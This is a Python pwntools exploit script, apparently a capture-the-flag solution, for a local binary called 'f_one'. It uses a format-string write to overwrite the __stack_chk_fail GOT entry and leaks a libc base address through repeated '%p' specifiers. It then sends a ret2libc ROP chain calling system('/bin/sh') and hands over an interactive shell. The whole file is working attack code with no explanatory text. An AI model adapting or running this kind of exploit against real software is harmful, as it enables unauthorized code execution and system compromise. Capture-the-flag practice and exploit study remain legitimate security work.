from pwn import *

#defines
BACK_FUNC_TRACE = 0x00000000004006b7
END_OF_VULN = 0x000000000040071d
STACK_CHK_FAIL = 0x000000600ba0
MAX_STR_SIZE = 108
PADDING =  b"a" * (32)
FGETS = p64(0x00000000004006da)
SYSTEM_OFFSET = 0x0000000000041710
BINSH_OFFSET = 0x175e93

#gadgets
ret = 0x0000000000400566
pop_rdi = 0x00000000004007f3
syscall = 0x00000000004006dd

def leak_libc(p: process):
    p.sendline("%p" * 40)
    p.recvuntil("give")
    p.recvuntil("give")
    p.recvuntil("0x")
    p.recvuntil("0x")
    p.recvuntil("0x")
    libc = eval("0x" + p.recvuntil("0x")[:-2].decode()) - 0xe4631
    print("libc: ", hex(libc))
    return libc

def set_target_func(addr: int):
    first_target_address = STACK_CHK_FAIL
    fmt_offset = 6
    payload = fmtstr_payload(fmt_offset, {
        first_target_address: addr,   
    })
    payload += PADDING

    return payload

def main():
    ### context ###
    binary = ELF('./f_one')
    context.binary = binary

    ### run ###
    ld_path = './ld-2.27.so'
    libc_path = './'
    binary = './f_one'

    # Launch the process with the library path set
    p = process([ld_path, '--library-path', libc_path, binary])

    ### payload start ###
    payload = set_target_func(BACK_FUNC_TRACE)

    #craft ropchain
    with open("p", "wb") as f:
        f.write(payload)

    p.sendline(payload)
    libc = leak_libc(p)
    payload = set_target_func(END_OF_VULN)
    payload += p64(pop_rdi)
    payload += p64(libc + BINSH_OFFSET)
    payload += p64(libc + SYSTEM_OFFSET)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main() 
